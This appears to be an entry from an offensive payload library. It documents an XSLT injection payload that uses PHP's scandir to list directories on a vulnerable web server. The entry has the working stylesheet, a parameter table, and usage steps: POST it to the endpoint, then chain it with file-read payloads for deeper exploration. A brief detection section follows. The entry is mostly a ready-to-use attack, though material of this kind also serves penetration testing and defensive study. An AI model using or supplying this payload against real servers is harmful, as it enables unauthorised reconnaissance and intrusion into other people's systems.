---
id: d0fbf3c3-5549-4af3-a2bf-5ba8ca5114af
name: xslt-php-scandir-payload
type: code
language: xml
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
  - PHP
tags:
  - xslt-injection
  - directory-enum
  - rce
validated: true
---

# XSLT PHP Scandir Payload

## Code

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
        </xsl:template>
</xsl:stylesheet>
```

## Description

This XSLT payload uses the PHP scandir function to list files and directories in a specified path, outputting the results as a serialized array in the transformation. It employs a template match to execute the function and is useful for filesystem reconnaissance in XSLT injection scenarios.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| '.' | Directory path to scan | '.' (current) or '/var/www/html' |

## Usage

POST this stylesheet to the vulnerable endpoint wrapped in a minimal XML document (e.g., <?xml ...><root/>). The output will include an array like Array ( [0] => . [1] => .. [2] => index.php ), helping identify targets for further reads or uploads. Combine with file read payloads for deeper exploration.

## Detection

- Scan for scandir calls in XML payloads or logs of directory listings from web servers.
- File access audits showing enumeration patterns from application processes.
- Anomalous array outputs in XSLT transformation logs.

## Related

- [[procedures/xslt-injection-for-php-remote-code-execution]]
- [[techniques/XSL Script Processing|T1220]]
